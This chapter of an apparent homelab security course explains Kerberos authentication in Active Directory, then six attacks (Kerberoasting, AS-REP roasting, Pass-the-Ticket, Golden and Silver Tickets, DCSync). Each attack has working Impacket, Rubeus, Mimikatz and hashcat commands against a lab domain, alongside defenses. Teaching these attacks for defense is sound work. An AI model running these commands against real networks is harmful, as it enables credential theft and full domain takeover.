# 05 — Kerberos: Authentication and Attacks

## What Is Kerberos

**Kerberos** is the primary authentication protocol in Active Directory
environments. Named after the three-headed dog guarding the underworld
in Greek mythology — because it has three parties: the client, the
server, and the trusted third party (KDC).

Designed at MIT in the 1980s, adopted by Microsoft in Windows 2000,
and still the default in Windows environments today.

**Core idea:** Prove your identity once, receive a ticket, use the
ticket to access services — without sending your password across the network.

---

## The Three Actors

```
┌──────────────────────────────────────────────────────┐
│               Domain Controller (DC)                  │
│                                                        │
│  ┌─────────────────────────────────────────────────┐  │
│  │        KDC — Key Distribution Center            │  │
│  │                                                  │  │
│  │  ┌──────────────┐    ┌──────────────────────┐   │  │
│  │  │      AS      │    │        TGS           │   │  │
│  │  │ Authentication│   │  Ticket Granting     │   │  │
│  │  │   Service    │    │      Service         │   │  │
│  │  └──────────────┘    └──────────────────────┘   │  │
│  └─────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────┘

        Client                          Service
   (User / Computer)              (File share, SQL, etc.)
```

- **KDC** — runs on the DC. Issues all tickets.
- **AS (Authentication Service)** — verifies identity, issues TGT.
- **TGS (Ticket Granting Service)** — issues service tickets (TGS tickets).
- **Client** — the user or computer requesting access.
- **Service** — what the client wants to access.

---

## Kerberos Ticket Types

### TGT — Ticket Granting Ticket
The "master ticket." Proves the user authenticated.
- Issued by the AS after successful login
- Encrypted with the **krbtgt account's hash**
- Valid for 10 hours by default
- Stored in memory (LSASS on Windows)
- Used to request TGS tickets

### TGS — Ticket Granting Service Ticket (Service Ticket)
The "access ticket" for a specific service.
- Issued by the TGS in exchange for a TGT
- Encrypted with the **service account's hash**
- Contains: user identity, access rights, validity period
- Presented to the service to gain access

### PAC — Privilege Attribute Certificate
Embedded in both TGT and TGS tickets.
- Contains: username, group memberships, SID
- Signed by the KDC (krbtgt key) and the service key
- The service uses it to determine what the user can access

---

## The Full Authentication Flow

### Step 1: AS-REQ — Request TGT
```
Client → KDC (AS): "I am Alice. I want to log in."
                   + timestamp encrypted with Alice's password hash
```

The timestamp proves the client knows the password (without sending it).

### Step 2: AS-REP — Receive TGT
```
KDC (AS) → Client: Here's your TGT!
           + TGT (encrypted with krbtgt hash — client can't read this)
           + Session Key (encrypted with Alice's hash — client can read this)
```

The client decrypts the session key using their password hash.
The TGT is stored in memory.

### Step 3: TGS-REQ — Request Service Ticket
```
Client → KDC (TGS): "I want to access the file server."
                    + TGT (proving I authenticated)
                    + Authenticator (encrypted with session key)
                    + SPN: "cifs/fileserver.homelab.local"
```

**SPN (Service Principal Name)** identifies the service. Format:
`ServiceClass/hostname:port`
Examples:
- `cifs/fileserver.homelab.local` — SMB file share
- `http/webserver.homelab.local` — Web service
- `MSSQLSvc/sql.homelab.local:1433` — SQL Server

### Step 4: TGS-REP — Receive Service Ticket
```
KDC (TGS) → Client: Here's your service ticket!
            + TGS ticket (encrypted with SERVICE ACCOUNT's hash)
            + Session Key for the service
```

**Critical:** The service ticket is encrypted with the service account's
NTLM hash. The client cannot read its contents — but can store it.

### Step 5: AP-REQ — Access the Service
```
Client → Service: "I want access."
                  + TGS ticket
                  + Authenticator (encrypted with service session key)
```

The service decrypts the TGS ticket using its own password hash,
reads the PAC (group memberships), and grants/denies access.

### Visual Summary
```
Alice logs in:
1. Alice ──AS-REQ (timestamp)──────▶ KDC
2. Alice ◀──AS-REP (TGT + SK)─────  KDC

Alice accesses file server:
3. Alice ──TGS-REQ (TGT + SPN)────▶ KDC
4. Alice ◀──TGS-REP (TGS + SK2)──  KDC
5. Alice ──AP-REQ (TGS)────────────▶ FileServer
6. Alice ◀──AP-REP (access granted)  FileServer
```

---

## Why Kerberos Matters for Attacks

### The Key Insight
- **TGT encrypted with krbtgt hash** → Compromise krbtgt = forge any TGT (Golden Ticket)
- **TGS encrypted with service account hash** → Extract TGS → crack offline (Kerberoasting)
- **Client stores tickets in memory** → Steal tickets → reuse them (Pass-the-Ticket)
- **No pre-auth required (misconfiguration)** → Get encrypted data → crack offline (AS-REP Roasting)

---

## Kerberos Attacks

### 1. Kerberoasting
**Target:** Service accounts
**Requires:** Valid domain user account (any low-privilege user)

**How it works:**
1. Request TGS tickets for services with SPNs
2. The TGS ticket is encrypted with the **service account's NTLM hash**
3. Extract the ticket and crack the hash **offline**
4. No interaction with the service needed — just the KDC

```bash
# With Impacket (from Kali, no domain join needed)
python3 GetUserSPNs.py homelab.local/alice:Password1 \
  -dc-ip 10.20.20.10 -request

# Output: Kerberos hashes
$krb5tgs$23$*svc_sql$HOMELAB.LOCAL$homelab.local/svc_sql*$...

# Crack with Hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Why it works:** Service account passwords are often never changed
(set once when the service was installed). Weak passwords are crackable.

**Defense:** Use strong, random passwords (32+ chars) for service accounts.
Use Group Managed Service Accounts (gMSA) — auto-rotating passwords.

---

### 2. AS-REP Roasting
**Target:** Users with "Do not require Kerberos preauthentication" enabled
**Requires:** Network access (no domain account needed for enumeration)

**How it works:**
1. Without pre-authentication, the KDC responds to AS-REQ with AS-REP
   without verifying the client's identity first
2. The AS-REP contains data encrypted with the user's hash
3. Extract that encrypted blob and crack it offline

```bash
# Find users without pre-auth (Impacket)
python3 GetNPUsers.py homelab.local/ -dc-ip 10.20.20.10 \
  -usersfile users.txt -no-pass -format hashcat

# Output
$krb5asrep$23$bob@HOMELAB.LOCAL:...encrypted data...

# Crack with Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Defense:** Enable pre-authentication for all accounts. Audit regularly
with: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}`.

---

### 3. Pass-the-Ticket (PtT)
**Target:** Any service the victim user has a valid ticket for
**Requires:** Ability to read LSASS memory (admin on victim machine)

**How it works:**
1. Extract TGT/TGS tickets from memory (Mimikatz/Rubeus)
2. Import the ticket into our own session
3. Access resources as that user — without the password

```bash
# Extract tickets with Rubeus
Rubeus.exe dump /user:alice /nowrap

# Import stolen ticket
Rubeus.exe ptt /ticket:base64_encoded_ticket

# Or with Mimikatz
sekurlsa::tickets /export           # Export all tickets to files
kerberos::ptt [0;12345]-0-0-40810000-alice@krbtgt-HOMELAB.LOCAL.kirbi
```

**Why it works:** Tickets are valid for 10 hours. If an admin leaves
a session open, their tickets are reusable.

**Defense:** Short ticket lifetimes. Monitor for unusual ticket usage.
Restrict local admin rights.

---

### 4. Golden Ticket
**Target:** Entire domain — any user, any service, any time
**Requires:** krbtgt password hash (requires Domain Admin first)

**How it works:**
1. Compromise Domain Admin
2. Extract the `krbtgt` account hash (DCSync or NTDS.dit)
3. Forge TGTs for any user with any group membership
4. These forged TGTs bypass normal authentication

```bash
# Get krbtgt hash (with Domain Admin)
python3 secretsdump.py homelab.local/Administrator:Password1@10.20.20.10

# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_HERE:::

# Create Golden Ticket (Mimikatz)
kerberos::golden /user:FakeAdmin /domain:homelab.local \
  /sid:S-1-5-21-XXXXXXX /krbtgt:HASH /ptt

# Now access any machine as Domain Admin
dir \\dc.homelab.local\C$
```

**Why it's the worst case:** Golden tickets persist for 10 years by default.
Even if the admin password is changed, the golden ticket still works —
until the krbtgt password is changed **twice**.

**Defense:** Immediately change krbtgt password twice after any compromise.
Tier 0 isolation for Domain Controllers.

---

### 5. Silver Ticket
**Target:** Specific service only
**Requires:** Service account hash (lower privilege than Golden Ticket)

**How it works:**
1. Obtain service account hash (Kerberoasting, dump, etc.)
2. Forge a TGS ticket for that service
3. Access the service as any user, bypassing the KDC

```bash
# Forge Silver Ticket (Mimikatz)
kerberos::golden /user:alice /domain:homelab.local \
  /sid:S-1-5-21-XXXXXXX /target:fileserver.homelab.local \
  /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt

# Access the specific service
dir \\fileserver.homelab.local\share
```

**Why it's stealthier than Golden Ticket:** Silver tickets never
touch the KDC — no KDC logs generated.

**Defense:** Monitor for anomalous service ticket usage. Protected Users
security group mitigates some Silver Ticket attacks.

---

### 6. DCSync
**Target:** All domain credential hashes
**Requires:** Replication privileges (Domain Admin, or delegated)

**How it works:**
Simulate a Domain Controller's replication request. The real DC
sends all password hashes as part of normal replication.

```bash
# With Mimikatz
lsadump::dcsync /domain:homelab.local /all /csv

# With Impacket (from Kali, remotely)
python3 secretsdump.py homelab.local/Administrator:Password1@10.20.20.10
# Output: ALL NTLM hashes for ALL users in the domain
```

**Why it's powerful:** Gets every hash without ever touching NTDS.dit.
Works remotely. Leaves minimal traces.

**Defense:** Restrict who has replication rights. Alert on replication
from non-DC machines.

---

## Kerberos Attack Summary

| Attack | Requires | Gets You | Noise Level |
|---|---|---|---|
| Kerberoasting | Any domain user | Service account hash | Low |
| AS-REP Roasting | Network access | User hash | Very Low |
| Pass-the-Ticket | Local admin on victim | That user's access | Low |
| Golden Ticket | krbtgt hash (DA) | Everything, forever | Low |
| Silver Ticket | Service account hash | Specific service | Very Low |
| DCSync | Replication rights (DA) | All hashes | Medium |

**Attack path in our Phase 4 lab:**
```
Low-priv user → Kerberoasting → Crack service account →
Lateral movement → Domain Admin → DCSync → All hashes → Golden Ticket
```

---

## Key Takeaways

- Kerberos uses tickets instead of passwords — you authenticate once
  and get tickets that prove your identity
- TGT = master ticket (encrypted with krbtgt hash) — used to get TGS tickets
- TGS = service ticket (encrypted with service account hash) — grants
  access to specific services
- The krbtgt hash is the most sensitive secret in any AD environment
- Kerberoasting is low-risk and often the first escalation technique:
  any domain user can request service tickets
- Golden Ticket = persistent access even after password changes
  (until krbtgt is rotated twice)
- Most Kerberos attacks involve offline cracking — no repeated failed
  login attempts, so account lockout doesn't trigger
